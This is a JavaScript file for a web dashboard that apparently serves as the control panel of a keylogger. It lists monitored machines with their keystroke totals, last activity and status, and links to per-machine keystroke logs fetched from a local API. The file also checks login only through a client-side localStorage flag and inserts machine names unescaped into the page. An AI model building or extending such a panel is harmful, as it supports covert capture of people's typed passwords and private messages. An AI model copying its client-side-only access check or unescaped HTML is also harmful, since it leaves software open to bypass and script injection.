document.addEventListener('DOMContentLoaded', function () {
    if (localStorage.getItem('isLoggedIn') !== 'true') {
        window.location.href = 'login.html';
    }

    updateDashboard();

    // Update clock every second
    setInterval(updateClock, 1000);
    updateClock();

    // Profile button click event
    document.getElementById('profileButton').addEventListener('click', function () {
        alert('Profile section coming soon!');
    });

    // Logout button click event
    document.getElementById('logoutButton').addEventListener('click', function () {
        localStorage.removeItem('isLoggedIn');
        window.location.href = 'login.html';
    });

    // Refresh button click event
    document.getElementById('refreshButton').addEventListener('click', function () {
        const button = document.getElementById('refreshButton');
        button.innerHTML = '<span class="spinner-border spinner-border-sm me-2"></span>Refreshing...';
        button.disabled = true;
        
        updateDashboard().finally(() => {
            setTimeout(() => {
                button.innerHTML = '<i class="fas fa-sync-alt me-2"></i>Refresh';
                button.disabled = false;
            }, 1000);
        });
    });

    // Setup sorting functionality
    setupTableSorting();

    // Load hostages ticker
    loadHostagesTicker();
});

// Global variables for sorting
let currentSortColumn = 'name';
let currentSortDirection = 'asc';

function setupTableSorting() {
    document.querySelectorAll('.sortable').forEach(headerCell => {
        headerCell.addEventListener('click', function() {
            const sortColumn = this.getAttribute('data-sort');
            
            // Toggle sort direction if clicking the same column
            if (sortColumn === currentSortColumn) {
                currentSortDirection = currentSortDirection === 'asc' ? 'desc' : 'asc';
            } else {
                currentSortColumn = sortColumn;
                currentSortDirection = 'asc';
            }
            
            // Update UI to show sort direction
            document.querySelectorAll('.sortable').forEach(header => {
                header.classList.remove('asc', 'desc');
            });
            this.classList.add(currentSortDirection);
            
            // Update displayed data
            getMachinesDetails().then(machines => {
                const sortedMachines = sortMachines(machines);
                updateMachinesTable(sortedMachines);
            });
        });
    });
}

// Function to sort machines based on current sort settings
function sortMachines(machines) {
    return [...machines].sort((a, b) => {
        let valueA, valueB;
        
        switch(currentSortColumn) {
            case 'name':
                valueA = a.name.toLowerCase();
                valueB = b.name.toLowerCase();
                break;
            case 'status':
                valueA = a.is_active ? 1 : 0;
                valueB = b.is_active ? 1 : 0;
                break;
            case 'lastActivity':
                valueA = a.last_activity ? new Date(a.last_activity).getTime() : 0;
                valueB = b.last_activity ? new Date(b.last_activity).getTime() : 0;
                break;
            case 'keystrokes':
                valueA = a.total_keystrokes;
                valueB = b.total_keystrokes;
                break;
            default:
                return 0;
        }
        
        const comparison = valueA > valueB ? 1 : valueA < valueB ? -1 : 0;
        return currentSortDirection === 'asc' ? comparison : -comparison;
    });
}

function updateDashboard() {
    return getMachinesDetails().then(machines => {
        // Update statistics
        updateStatistics(machines);
        
        // Sort machines before updating table
        const sortedMachines = sortMachines(machines);
        
        // Update machines table
        updateMachinesTable(sortedMachines);
    }).catch(error => {
        console.error('Error updating dashboard:', error);
    });
}

function updateStatistics(machines) {
    let totalKeystrokes = 0;
    let activeMachines = 0;
    
    machines.forEach(machine => {
        totalKeystrokes += machine.total_keystrokes;
        if (machine.is_active) {
            activeMachines++;
        }
    });
    
    document.getElementById('machineCount').textContent = machines.length;
    document.getElementById('activeMachinesCount').textContent = activeMachines;
    document.getElementById('totalKeystrokes').textContent = totalKeystrokes.toLocaleString();
}

function updateMachinesTable(machines) {
    const machinesList = document.getElementById('machinesList');
    machinesList.innerHTML = '';
    
    if (machines.length === 0) {
        const emptyRow = document.createElement('tr');
        emptyRow.innerHTML = '<td colspan="5" class="text-center py-4">No machines found</td>';
        machinesList.appendChild(emptyRow);
        return;
    }
    
    machines.forEach(machine => {
        const row = document.createElement('tr');
        
        const lastActivity = machine.last_activity ? 
            formatDateTime(machine.last_activity) : 'Never';
        
        const status = machine.is_active ? 
            '<span class="status-badge bg-success">Active</span>' : 
            '<span class="status-badge bg-secondary">Inactive</span>';
        
        row.innerHTML = `
            <td>${machine.name}</td>
            <td>${status}</td>
            <td>${lastActivity}</td>
            <td>${machine.total_keystrokes.toLocaleString()}</td>
            <td>
                <button class="btn btn-info btn-sm btn-cyber view-logs-btn" data-machine="${machine.name}">
                    <i class="fas fa-eye me-1"></i>View Logs
                </button>
            </td>
        `;
        
        machinesList.appendChild(row);
    });
    
    // Add event listeners to view logs buttons
    document.querySelectorAll('.view-logs-btn').forEach(button => {
        button.addEventListener('click', function() {
            const machine = this.getAttribute('data-machine');
            window.open(`machine.html?machine=${machine}`, '_blank');
        });
    });
}

function getMachinesDetails() {
    return fetch('http://127.0.0.1:5000/api/get_machines_details')
        .then(response => {
            if (!response.ok) {
                throw new Error('Network response was not ok ' + response.statusText);
            }
            return response.json();
        })
        .then(data => {
            console.log("Machine details:", data);
            return data.machines;
        })
        .catch(error => {
            console.error('There was a problem with the fetch operation:', error);
            return [];
        });
}

function formatDateTime(dateTimeStr) {
    const date = new Date(dateTimeStr);
    const today = new Date();
    
    // Check if the date is today
    if (date.toDateString() === today.toDateString()) {
        return 'Today ' + date.toLocaleTimeString();
    } else {
        return date.toLocaleDateString() + ' ' + date.toLocaleTimeString();
    }
}

function updateClock() {
    const now = new Date();
    const hours = String(now.getHours()).padStart(2, '0');
    const minutes = String(now.getMinutes()).padStart(2, '0');
    const seconds = String(now.getSeconds()).padStart(2, '0');
    const timeString = `${hours}:${minutes}:${seconds}`;
    document.getElementById('clock').textContent = timeString;
}

function loadHostagesTicker() {
    console.log('Loading hostages ticker...');
    var script = document.createElement("script");
    script.type = "text/javascript";
    script.src = "https://bringthemhomenow.net/1.1.0/hostages-ticker.js";
    script.setAttribute("crossorigin", "anonymous");
    document.getElementsByTagName("head")[0].appendChild(script);
}